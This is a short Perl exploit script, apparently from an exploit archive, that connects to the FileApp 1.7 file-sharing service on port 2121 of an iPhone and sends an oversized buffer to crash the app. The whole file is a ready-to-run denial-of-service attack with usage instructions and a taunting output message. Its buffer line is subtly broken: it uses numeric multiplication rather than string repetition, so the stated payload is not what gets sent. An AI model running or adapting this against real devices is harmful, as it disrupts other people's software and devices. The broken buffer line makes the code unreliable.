#!/usr/bin/perl
#
# Exploit: FileApp - Remote Dos Exploit
# Date: 17/02/10
# Author: Ale46
# Software Link: http://www.digidna.net/products/fileapp
# Version: 1.7
# Tested on: Iphone 3GS with 3.1.2 firmware
#Go in the sharing section of FileApp and run this script, the
application crash and your Iphone\Ipod returns to the SpringBoard

use IO::Socket;

if (@ARGV<1){
        print ("Usage: ./fileapp <server_ip>\n");
        exit();
    }

my $host = $ARGV[0];
my $port = 2121;
my $stuff = "A"*10000;
my $socket = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host,
PeerPort => $port);
unless ($socket) { die "Can\'t connect to $host" }
print "Sending evil buffer..\n";
sleep(2);
print $socket $stuff;
sleep(1);
print "Now your app is.. Dosed :D";